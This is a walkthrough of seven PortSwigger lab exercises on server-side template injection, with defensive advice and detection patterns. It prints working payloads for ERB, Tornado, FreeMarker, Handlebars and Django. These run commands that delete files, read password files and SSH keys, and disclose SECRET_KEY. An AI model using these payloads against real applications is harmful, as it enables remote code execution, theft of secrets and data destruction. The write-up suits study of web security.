# PortSwigger SSTI 1-7 — Template Context Before Payloads

This is a consolidated walkthrough of the seven PortSwigger server-side template injection labs.

All labs were solved in the authorized Web Security Academy environment. The main lesson is that SSTI is context first, payload second. The right exploit depends on whether input lands in template text, an expression, a user-editable template, a sandboxed object context, or a custom business object.

## 1. Overview

| # | Lab | Engine/context | Core idea |
|---|-----|----------------|-----------|
| 1 | basic SSTI | Ruby ERB text context | `<%= 7*7 %>`, then `system()` |
| 2 | basic SSTI code context | Tornado preferred-name expression | break out with `}}`, import `os` |
| 3 | using documentation | FreeMarker | use `Execute` utility via `?new` |
| 4 | unknown language documented exploit | Handlebars | identify engine by error, use constructor gadget |
| 5 | information disclosure via objects | Django template | `{% debug %}` then `settings.SECRET_KEY` |
| 6 | sandboxed environment | FreeMarker sandbox | `product.getClass()` method chain reads a file |
| 7 | custom exploit | business `user` object | `setAvatar()` arbitrary file read + `gdprDelete()` delete primitive |

## 2. Workflow

```text
1. Find the template-controlled surface.
2. Determine the context:
   - raw text
   - expression/code context
   - editable server-side template
   - sandboxed object context
   - custom business object
3. Fingerprint the engine with harmless arithmetic and syntax probes.
4. Read documentation for built-ins, object access, and dangerous helpers.
5. Build the smallest impact: render 49, disclose a value, read a file, then perform the required final action.
```

Common probes:

```text
<%= 7*7 %>  -> ERB
{{7*7}}     -> Jinja/Tornado/Handlebars-like family
${7*7}      -> FreeMarker/Velocity/EL family
{% debug %} -> Django template debug tag
```

## 3. ERB text context

The first lab places the `message` parameter directly into an ERB template. A harmless proof:

```erb
<%= 7*7 %>
```

renders `49`. Ruby's `system()` then performs the required file deletion:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

## 4. Tornado code context

The preferred-name feature inserts a user-controlled value into an existing Tornado expression. This is a code-context problem, so the payload first closes the original expression:

```text
user.name}}{{7*7}}
```

Then it imports `os` and runs the final command:

```text
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
```

The important distinction is that `{{7*7}}` alone is not the exploit. The exploit starts by escaping the current syntactic context.

## 5. FreeMarker via documentation

The documentation route leads to `freemarker.template.utility.Execute` and the `?new` built-in:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```

The one-line form is equivalent:

```freemarker
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

## 6. Handlebars documented exploit

A mixed syntax probe causes an error that identifies Handlebars:

```text
${{<%[%'"}}%\
```

The documented exploit pivots through constructor access and executes JavaScript. The command-specific part is:

```js
return require('child_process').exec('rm /home/carlos/morale.txt');
```

The lesson is that constrained template languages often become dangerous through helpers and object constructors rather than direct command primitives.

## 7. Django information disclosure

This lab is not about code execution. The product template exposes useful objects. Django's debug tag lists the context:

```django
{% debug %}
```

The `settings` object is available, so the secret is rendered directly:

```django
{{settings.SECRET_KEY}}
```

SSTI impact can be sensitive configuration disclosure even when the engine does not expose arbitrary execution.

## 8. FreeMarker sandbox breakout

The sandboxed lab exposes a `product` object. Java object methods provide the path out:

```freemarker
${product.getClass()}
```

The full chain reads Carlos's password file through `CodeSource` and URL streams:

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

The output is decimal ASCII bytes; convert them back to a string and submit it.

## 9. Custom business-object exploit

The final lab gives access to a `user` object. The exploit path is business-logic oriented:

1. Trigger avatar upload errors to learn about `user.setAvatar()` and `/home/carlos/User.php`.
2. Set the avatar to `/etc/passwd` with an image MIME type and fetch `/avatar?avatar=wiener` to confirm arbitrary file read.
3. Read `/home/carlos/User.php` and find `gdprDelete()`.
4. Set the avatar to `/home/carlos/.ssh/id_rsa`.
5. Call `user.gdprDelete()` to delete that file.

The important shift is from template-engine exploitation to object capability analysis.

## 10. Defense and detection

Hardening:

- Never concatenate user input into template source.
- Pass user input as data variables only.
- Do not let low-privilege users edit server-side templates.
- Expose minimal safe objects to templates.
- Keep framework settings, request objects, user models, and service objects out of template context unless strictly required.
- Disable or wrap dangerous helpers and built-ins such as `?new`, constructor access, `system`, and arbitrary object methods.
- Return generic template errors to users.

Detection ideas:

- Parameters containing `<%=`, `{{`, `${`, `{%`, `#with`, `?new`, `getClass()`, `constructor`.
- Template edits containing `settings.SECRET_KEY`, `debug`, `child_process`, `system(`, `openStream`, or file paths under `/home/`.
- Template error pages exposing engine names, stack traces, class paths, or method signatures.
- Avatar/image endpoints returning non-image data.
- Profile display-name changes followed by file reads, file deletion, or process execution.

No lab in this series required Collaborator/OAST. The recurring pattern is to map the template context and object capabilities before choosing a payload.
